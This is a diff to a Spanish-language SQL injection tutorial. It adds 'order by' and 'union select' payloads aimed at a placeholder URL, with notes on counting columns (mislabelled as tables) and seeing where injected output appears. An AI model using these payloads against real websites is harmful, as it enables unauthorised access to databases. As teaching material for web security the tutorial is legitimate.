@@ -127,7 +127,13 @@ Lo primero que realizaremos, será obtener algún tipo de error, para ello inten
 
 `http://fakesite.com/report.php?id=23' ` # Con una comilla final.
 
-`http://fakesite.com/report.php?id=23' group by 5;-- - ` # Intentamos sacar cuantas tablas tiene la BBDD.
+`http://fakesite.com/report.php?id=23' order by 5;-- - ` # Intentamos sacar cuantas tablas tiene la BBDD.
 
-*A tener en cuenta, que a veces cuando sobre-excedemos con el group by, cierto contenido de la web, puede desaparecer*
+*A tener en cuenta, que a veces cuando sobre-excedemos con el order by, cierto contenido de la web, puede desaparecer*
+
+`http://fakesite.com/report.php?id=23' union select 1,2,3,4,5;-- -` # Suponiendo que tenga 5 tablas, enumeramos.
+
+*Podemos sustituir los números por lo que queramos, la cosa es tener visible que nos reporta la inyección de la query*
+
+
 
